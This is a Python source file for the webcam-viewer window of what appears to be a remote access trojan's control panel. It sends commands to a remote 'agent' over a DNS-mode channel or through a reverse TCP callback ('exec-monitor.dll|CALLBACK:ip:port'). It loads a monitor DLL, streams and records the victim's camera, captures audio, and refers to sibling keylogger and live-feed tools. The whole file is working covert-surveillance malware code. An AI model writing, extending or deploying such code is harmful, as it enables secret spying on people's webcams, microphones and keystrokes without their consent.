import tkinter as tk
from tkinter import ttk
import io
import os
import time
import threading
from PIL import Image, ImageTk
from tools.tcp_client import TCPVideoClient, AudioClient
import cv2
import numpy as np

def get_icon_path():

    base_dir = os.environ.get('TAO_BASE_DIR')
    if not base_dir:

        current_file_dir = os.path.dirname(os.path.abspath(__file__))
        base_dir = os.path.abspath(os.path.join(current_file_dir, ".."))
    
    return os.path.join(base_dir, "ico", "ico.ico")

class CameraClient:

    PKT_CAMERA_FRAME = 0x08
    PKT_COMMAND = 0x05
    PKT_COMMAND_ACK = 0x06

    def __init__(self, parent, controller, agent_ip, video_client=None, state_callback=None):
        self.video_client = video_client
        self.active = False
        self.callback = None
        self.frame_count = 0

    def start_camera(self):

        if not self.video_client or not self.video_client.session_active:
            return False

        if self.video_client.send_command("START_CAMERA"):
            print("CAMERA: Start command sent")
            self.active = True
            self.frame_count = 0

            if self.callback:
                self.callback("started", None)

            return True
        return False

    def stop_camera(self):

        if not self.video_client:
            return False

        self.active = False

        if self.callback:
            self.callback("stopped", self.frame_count)

        if self.video_client.send_command("STOP_CAMERA"):
            print("CAMERA: Capture stopped")
            return True
        return False

    def process_camera_frame(self, frame_data):

        if self.active and self.callback:
            self.frame_count += 1
            try:
                self.callback("frame", frame_data)
            except Exception as e:
                print(f"CAMERA: Display error: {e}")

    def set_callback(self, callback):
        self.callback = callback

class CameraWindow:
    def __init__(self, parent, controller, agent_ip, video_client=None):
        self.controller = controller
        self.agent_ip = agent_ip

        self.window = tk.Toplevel(parent)
        self.window.title("Camera Feed")
        icon_path = get_icon_path()
        if os.path.exists(icon_path):
            try:
                self.window.wm_iconbitmap(icon_path)
            except Exception:
                pass
        self.window.geometry("640x520")
        self.window.resizable(False, False)
        self.window.configure(bg="#0D0D0D")
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)

        self.video_client = video_client
        self.is_shared_client = (video_client is not None)
        self.camera_active = False
        self.frame_count = 0
        self.last_image = None
        self.is_recording_camera = False
        self.camera_video_writer = None
        self.audio_client = None
        self._build_ui()

        if self.video_client and self.video_client.session_active:
            self.status_label.config(text="CAMERA: READY (Shared)", fg="#4CAF50")
            self.start_btn.config(state="normal")
            self.controller._log_m("CAMERA: Using shared connection")
            self.video_client.camera_client_ref = self
        else:
            self.status_label.config(text="CAMERA: Connecting...", fg="#FFA500")
            self.start_btn.config(state="disabled")
            self._safe_after(500, self.connect_to_agent)

    def _window_alive(self) -> bool:

        try:
            return bool(self.window.winfo_exists())
        except Exception:
            return False

    def _safe_after(self, delay, func, *args):

        if not self._window_alive():
            return
        def _guarded():
            if self._window_alive():
                func(*args)
        self.window.after(delay, _guarded)

    def _build_ui(self):

        toolbar = tk.Frame(self.window, bg="#1A1A1A", height=40)
        toolbar.pack(fill="x", padx=5, pady=5)
        toolbar.pack_propagate(False)

        self.status_label = tk.Label(toolbar, text="SYS: Initializing...", 
                                     bg="#1A1A1A", fg="white", 
                                     font=("Arial", 10, "bold"))
        self.status_label.pack(side="left", padx=10)

        self.info_label = tk.Label(toolbar, text="Frames: 0", 
                                   bg="#1A1A1A", fg="#888", 
                                   font=("Arial", 9))
        self.info_label.pack(side="right", padx=10)

        btn_frame = tk.Frame(self.window, bg="#0D0D0D")
        btn_frame.pack(fill="x", padx=5, pady=5)

        self.start_btn = tk.Button(btn_frame, text="▶ Start", 
                                   command=self.start_camera, 
                                   bg="#4CAF50", fg="white", 
                                   font=("Arial", 9, "bold"), 
                                   padx=15, state="disabled")
        self.start_btn.pack(side="left", padx=5)

        self.stop_btn = tk.Button(btn_frame, text="⏹ Stop", 
                                  command=self.stop_camera, 
                                  bg="#FF9800", fg="white", 
                                  font=("Arial", 9, "bold"), 
                                  padx=15, state="disabled")
        self.stop_btn.pack(side="left", padx=5)

        tk.Button(btn_frame, text="📸 Snapshot", 
                  command=self.take_snapshot, 
                  bg="#6A1B9A", fg="white", 
                  font=("Arial", 9, "bold"), 
                  padx=10).pack(side="left", padx=5)

        self.canvas_frame = tk.Frame(self.window, bg="black")
        self.canvas_frame.pack(fill="both", expand=True, padx=5, pady=5)

        self.image_label = tk.Label(self.canvas_frame, 
                                    text="[ NO VIDEO SIGNAL ]", 
                                    bg="black", fg="#333")
        self.image_label.pack(fill="both", expand=True)

    def connect_to_agent(self):

        if self.video_client and self.video_client.session_active:
            self.controller._log_m("CAMERA: Using shared connection")
            self.video_client.camera_client_ref = self
            self._safe_after(0, lambda: self.status_label.config(text="CAMERA: READY (Shared)", fg="#4CAF50"))
            self._safe_after(0, lambda: self.start_btn.config(state="normal"))
            return

        if self.controller.active_mode == "dns":
            self.controller._log_m(f"CAMERA: Connecting to {self.agent_ip}:443...")
            self.video_client = TCPVideoClient(self.agent_ip, port=443)
            self.video_client.camera_client_ref = self
            threading.Thread(target=self._do_connect, daemon=True).start()
        else:
            self.controller._log_m("CAMERA: HTTP mode — starting reverse listener...")
            threading.Thread(target=self._connect_reverse, daemon=True).start()

    def _connect_reverse(self):
        from tools.reverse_listener import ReverseTCPListener

        port = 9003   

        listener = ReverseTCPListener(port=port, timeout=30, log_fn=self.controller._log_m)
        if not listener.start():
            self._safe_after(0, lambda: self.status_label.config(
                text="✗ Listener failed", fg="#FF4444"))
            return

        controller_ip = ReverseTCPListener.get_local_ip()
        callback_cmd  = f"exec-monitor.dll|CALLBACK:{controller_ip}:{port}"
        self.controller._log_m(f"CAMERA: Sending callback command → {callback_cmd}")
        self.controller._send_http_cmd(callback_cmd)

        self._safe_after(0, lambda: self.status_label.config(
            text=f"SYS: Waiting for agent ({port})...", fg="#FFA500"))

        sock = listener.wait_for_connection()
        if not sock:
            self._safe_after(0, lambda: self.status_label.config(
                text="✗ Agent did not call back", fg="#FF4444"))
            self.controller._log_m("CAMERA: Reverse connection timed out")
            return

        self.video_client = TCPVideoClient.from_socket(sock, agent_ip=self.agent_ip)
        self.video_client.camera_client_ref = self

        self._safe_after(0, lambda: self.status_label.config(text="CAMERA: READY", fg="#4CAF50"))
        self._safe_after(0, lambda: self.start_btn.config(state="normal"))
        self.controller._log_m("CAMERA: Reverse connection established ✓")

    def _do_connect(self):

        if self.video_client.connect():
            self._safe_after(0, lambda: self.status_label.config(
                text="CAMERA: READY", fg="#4CAF50"))
            self._safe_after(0, lambda: self.start_btn.config(state="normal"))
            self.controller._log_m("CAMERA: Connected to server")
        else:
            self._safe_after(0, lambda: self.status_label.config(
                text="ERROR: Connection Failed", fg="#FF4444"))

    def toggle_audio(self):

        if not hasattr(self, 'audio_client') or not self.audio_client:

            if self.video_client and self.video_client.session_active:
                self.audio_client = AudioClient(self.video_client)
                self.audio_client.set_callback(self.on_audio_event)
                self.video_client.audio_client_ref = self.audio_client

        if not self.audio_client.recording:
            if self.audio_client.start_recording():
                self.audio_btn.config(text="🛑 Stop Audio", bg="#4CAF50")
                self.controller._log_system("Audio recording started")
        else:
            if self.audio_client.stop_recording():
                self.audio_btn.config(text="🎤 Audio", bg="#FF5722")
                self.controller._log_system("Audio recording stopped")

    def on_audio_event(self, event_type, data):

        if event_type == "started":
            self.controller._log_system(f"Recording to: {data}")
        elif event_type == "stopped":
            self.controller._log_system(f"Audio saved: {data}")

    def process_camera_frame(self, frame_data):
        if not self.camera_active:
            return

        try:

            img = Image.open(io.BytesIO(frame_data))
            self.last_image = img
            self.frame_count += 1

            if self.is_recording_camera and self.camera_video_writer:
                import cv2
                import numpy as np

                frame_bgr = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)

                if frame_bgr.shape[1] != 640 or frame_bgr.shape[0] != 480:
                    frame_bgr = cv2.resize(frame_bgr, (640, 480))

                self.camera_video_writer.write(frame_bgr)

            self._safe_after(0, lambda: self._update_display(img))

        except Exception as e:
            print(f"SESSION: Recording/Frame error: {e}")

    def _update_display(self, img):

        try:

            w = self.image_label.winfo_width()
            h = self.image_label.winfo_height()

            if w < 10 or h < 10:
                w, h = 640, 480 

            img_copy = img.copy()
            img_copy.thumbnail((w, h), getattr(Image, 'Resampling', Image).LANCZOS)

            photo = ImageTk.PhotoImage(img_copy)
            self.image_label.config(image=photo, text="") 
            self.image_label.image = photo 

            self.info_label.config(text=f"SESSION: Frames: {self.frame_count}")
        except Exception as e:
            pass

    def start_camera(self):
        if not self.video_client or not self.video_client.session_active:
            self.controller._log_m("CAMERA: No connection available")
            return

        if self.controller.active_mode == "dns" and not self.controller.monitor2_loaded:
            self.controller._log_m("CAMERA: 'Start' command sent")
            if self.controller.dns_mode.dns_cmd("exec-monitor.dll"):
                self.controller.monitor2_loaded = True
                self._safe_after(3000, self._send_start_cmd)
            else:
                self.controller._log_m("ERROR: Failed to start.")
            return

        self._send_start_cmd()

    def _send_start_cmd(self):
        if self.video_client.send_command("START_CAMERA"):
            self.camera_active = True
            self.start_btn.config(state="disabled")
            self.stop_btn.config(state="normal")
            self.status_label.config(text="🟢 LIVE FEED", fg="#4CAF50")
            self.controller._log_m("CAMERA: Camera started")

    def stop_camera(self):
        self.camera_active = False
        if self.video_client:
            self.video_client.send_command("STOP_CAMERA")
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.status_label.config(text="⏸ PAUSED", fg="#FFA500")

    def take_snapshot(self):
        if self.last_image:

            script_dir = os.path.dirname(os.path.abspath(__file__))
            save_dir = os.path.join(script_dir, "output", "camera")
            os.makedirs(save_dir, exist_ok=True)

            ts = int(time.time())
            path = os.path.join(save_dir, f"cam_{ts}.png")
            self.last_image.save(path)
            self.controller._log_m(f"CAMERA: snapshot saved: {path}")

    def on_close(self):

        self.controller._log_m("CAMERA: Closing window...")

        if hasattr(self, 'is_recording_camera') and self.is_recording_camera:
            self.is_recording_camera = False
            if hasattr(self, 'camera_video_writer') and self.camera_video_writer:
                self.camera_video_writer.release()
                self.camera_video_writer = None
                self.controller._log_m("CAMERA: Recording finalized")

        if hasattr(self, 'camera_active') and self.camera_active:
            self.stop_camera()

        if self.video_client:
            if getattr(self.video_client, 'camera_client_ref', None) == self:
                self.video_client.camera_client_ref = None

        if not self.is_shared_client and self.video_client:
            self.controller._log_m("CAMERA: Closing owned connection...")
            self.video_client.disconnect()
        else:
            self.controller._log_m("CAMERA: Detaching from shared connection")

        if self.controller.active_tool_windows.get('camera') == self:
            self.controller.active_tool_windows['camera'] = None

        monitor_tools = ['live_feed', 'keylogger', 'camera']
        still_open = [t for t in monitor_tools
                      if self.controller.active_tool_windows.get(t) is not None]
        if not still_open:
            self.controller.monitor2_loaded  = False
            self.controller.monitor2_loading = False
            if self.controller.active_mode != "dns":
                self.controller._send_taskkill("monitor.dll")
            self.controller._log_m("SESSION: All monitor tools closed — monitor.dll terminated")

        self.window.destroy()
        self.controller._log_m("CAMERA: Closed")